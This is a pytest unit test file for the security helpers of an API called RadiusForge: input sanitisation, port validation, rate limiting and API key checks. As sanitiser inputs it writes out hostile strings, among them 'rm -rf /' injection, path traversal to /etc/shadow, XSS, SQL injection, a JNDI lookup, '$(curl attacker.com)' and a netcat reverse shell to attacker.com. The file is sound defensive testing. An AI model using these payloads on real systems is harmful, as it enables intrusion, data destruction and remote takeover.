"""Unit tests for API Security features"""

import pytest
from unittest.mock import Mock, patch, MagicMock
import time
from pathlib import Path
import sys

# Import the API modules
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.api.main_simple import (
    validate_port_range, 
    sanitize_input, 
    rate_limit, 
    rate_limits,
    API_KEY
)


class TestAPISecurityValidations:
    """Test suite for API security validations"""
    
    def setup_method(self):
        """Setup before each test"""
        # Clear rate limits
        rate_limits.clear()
    
    def test_validate_port_range_valid_ports(self):
        """Test port range validation for valid ports"""
        valid_ports = [8910, 8911, 8912, 8913, 8914, 8915, 8916, 8917, 8918, 8919, 8920]
        
        for port in valid_ports:
            assert validate_port_range(port), f"Port {port} should be valid"
    
    def test_validate_port_range_invalid_ports(self):
        """Test port range validation for invalid ports"""
        invalid_ports = [8909, 8921, 8000, 3000, 80, 443, 22, 65536, 0, -1]
        
        for port in invalid_ports:
            assert not validate_port_range(port), f"Port {port} should be invalid"
    
    def test_sanitize_input_valid_strings(self):
        """Test input sanitization for valid strings"""
        test_cases = [
            ("hello", "hello"),
            ("test123", "test123"),
            ("file.txt", "file.txt"),
            ("my-file_name", "my-file_name"),
            ("path/to/file", "path/to/file"),
            ("app.py", "app.py"),
        ]
        
        for input_str, expected in test_cases:
            result = sanitize_input(input_str)
            assert result == expected, f"Expected '{expected}', got '{result}'"
    
    def test_sanitize_input_dangerous_characters(self):
        """Test input sanitization removes dangerous characters"""
        test_cases = [
            ("hello; rm -rf /", "hellormrf"),
            ("../../etc/passwd", "etcpasswd"),
            ("<script>alert('xss')</script>", "scriptalertxssscript"),
            ("file&name", "filename"),
            ("test|command", "testcommand"),
            ("name$(whoami)", "namewhoami"),
        ]
        
        for input_str, expected in test_cases:
            result = sanitize_input(input_str)
            assert result == expected, f"Input '{input_str}' should be sanitized to '{expected}', got '{result}'"
    
    def test_sanitize_input_length_limit(self):
        """Test input sanitization length limits"""
        long_string = "a" * 300
        
        with pytest.raises(Exception):  # Should raise HTTPException
            sanitize_input(long_string, max_length=255)
    
    def test_sanitize_input_non_string(self):
        """Test input sanitization with non-string input"""
        with pytest.raises(Exception):  # Should raise HTTPException
            sanitize_input(123)
        
        with pytest.raises(Exception):  # Should raise HTTPException
            sanitize_input(None)
        
        with pytest.raises(Exception):  # Should raise HTTPException
            sanitize_input(['list'])
    
    def test_rate_limit_within_limits(self):
        """Test rate limiting within allowed limits"""
        client_id = "test_client"
        
        # Should allow requests within limit
        for i in range(5):  # Default limit is 10
            rate_limit(client_id, limit=10, window=60)
        
        # Should have recorded 5 requests
        assert len(rate_limits[client_id]) == 5
    
    def test_rate_limit_exceeds_limit(self):
        """Test rate limiting when exceeding limits"""
        client_id = "test_client_limit"
        
        # Fill up to limit
        for i in range(3):
            rate_limit(client_id, limit=3, window=60)
        
        # Next request should fail
        with pytest.raises(Exception):  # Should raise HTTPException
            rate_limit(client_id, limit=3, window=60)
    
    def test_rate_limit_window_expiry(self):
        """Test rate limiting window expiry"""
        client_id = "test_client_expiry"
        
        # Mock time to simulate window expiry
        with patch('time.time') as mock_time:
            # Start at time 0
            mock_time.return_value = 0
            
            # Make requests at the limit
            for i in range(3):
                rate_limit(client_id, limit=3, window=10)
            
            # Should have 3 requests
            assert len(rate_limits[client_id]) == 3
            
            # Move time forward beyond window
            mock_time.return_value = 15  # 15 seconds later, outside 10-second window
            
            # Should allow new request as old ones expired
            rate_limit(client_id, limit=3, window=10)
            
            # Should only have 1 request (old ones cleaned up)
            assert len(rate_limits[client_id]) == 1
    
    def test_rate_limit_different_clients(self):
        """Test rate limiting is isolated per client"""
        client1 = "client1"
        client2 = "client2"
        
        # Fill limit for client1
        for i in range(3):
            rate_limit(client1, limit=3, window=60)
        
        # client2 should still be able to make requests
        for i in range(3):
            rate_limit(client2, limit=3, window=60)
        
        # Both clients should have their own limits
        assert len(rate_limits[client1]) == 3
        assert len(rate_limits[client2]) == 3
    
    def test_api_key_validation(self):
        """Test API key validation"""
        # API_KEY should be a secure string
        assert len(API_KEY) >= 16, "API key should be at least 16 characters"
        assert API_KEY != "your-secure-api-key-here", "API key should not be default value"
    
    def test_port_validation_integration(self):
        """Test port validation in realistic scenarios"""
        # Test all RadiusForge v1.3.0 ports
        radiusforge_ports = {
            "api": 8910,
            "ui": 8911,
            "websocket": 8912,
            "radius_test": 8913,
            "tacacs_test": 8914,
            "syslog": 8915,
            "metrics_export": 8916,
            "health_check": 8917,
            "admin_api": 8918,
            "backup_service": 8919,
            "reserved": 8920
        }
        
        for service, port in radiusforge_ports.items():
            assert validate_port_range(port), f"RadiusForge service {service} port {port} should be valid"
    
    def test_security_headers_validation(self):
        """Test security-related validations"""
        # Test that sensitive inputs are properly sanitized
        sensitive_inputs = [
            "../../../etc/shadow",
            "'; DROP TABLE users; --",
            "<img src=x onerror=alert(1)>",
            "${jndi:ldap://attacker.com/}",
            "$(curl attacker.com)",
            "|nc -e /bin/sh attacker.com 4444"
        ]
        
        for malicious_input in sensitive_inputs:
            sanitized = sanitize_input(malicious_input)
            
            # Should not contain any of these dangerous patterns
            dangerous_patterns = ["../", "DROP", "<", "${", "$(", "|nc"]
            for pattern in dangerous_patterns:
                assert pattern not in sanitized, f"Dangerous pattern '{pattern}' found in sanitized output: '{sanitized}'"


class TestSecurityConfiguration:
    """Test security configuration and setup"""
    
    def test_cors_configuration(self):
        """Test CORS configuration is restrictive"""
        # This would typically test the actual CORS middleware configuration
        # For now, we'll test the expected values
        allowed_origins = [
            "http://localhost:5173",
            "http://localhost:8911", 
            "http://127.0.0.1:5173",
            "http://127.0.0.1:8911"
        ]
        
        # All origins should be localhost only
        for origin in allowed_origins:
            assert "localhost" in origin or "127.0.0.1" in origin, f"Origin {origin} should be localhost only"
            assert origin.startswith("http://"), f"Origin {origin} should use HTTP for development"
    
    def test_security_defaults(self):
        """Test security defaults are properly configured"""
        # Rate limiting should be enabled by default
        assert callable(rate_limit), "Rate limiting function should be available"
        
        # Input sanitization should be available
        assert callable(sanitize_input), "Input sanitization should be available"
        
        # Port validation should be available
        assert callable(validate_port_range), "Port validation should be available"
    
    def test_deployment_security_requirements(self):
        """Test deployment security requirements"""
        # Verify all ports are in secure range
        min_port = 8910
        max_port = 8920
        
        # Test boundary conditions
        assert validate_port_range(min_port), "Minimum port should be valid"
        assert validate_port_range(max_port), "Maximum port should be valid"
        assert not validate_port_range(min_port - 1), "Below minimum should be invalid"
        assert not validate_port_range(max_port + 1), "Above maximum should be invalid"
    
    def test_bundle_security_validation(self):
        """Test bundle-related security validations"""
        # Test version string validation
        valid_versions = ["1.0.0", "1.3.0", "2.0.0", "10.15.23"]
        invalid_versions = ["1.0", "v1.0.0", "latest", "../1.0.0", "1.0.0; rm -rf /"]
        
        for version in valid_versions:
            # Should only contain dots and numbers
            sanitized = sanitize_input(version)
            assert all(c.isdigit() or c == '.' for c in sanitized), f"Version {version} should only contain digits and dots"
        
        for version in invalid_versions:
            sanitized = sanitize_input(version)
            # Should be cleaned of dangerous characters
            assert "../" not in sanitized, f"Version {version} should not contain path traversal"
            assert ";" not in sanitized, f"Version {version} should not contain command separators"
    
    def test_authentication_bypass_prevention(self):
        """Test authentication bypass prevention"""
        # Test that API key cannot be easily guessed or bypassed
        assert API_KEY != "", "API key should not be empty"
        assert API_KEY != "test", "API key should not be predictable"
        assert API_KEY != "admin", "API key should not be common word"
        assert API_KEY != "password", "API key should not be common password"
        
        # Should be cryptographically secure
        import string
        valid_chars = string.ascii_letters + string.digits + "-_"
        assert all(c in valid_chars for c in API_KEY), "API key should use secure character set"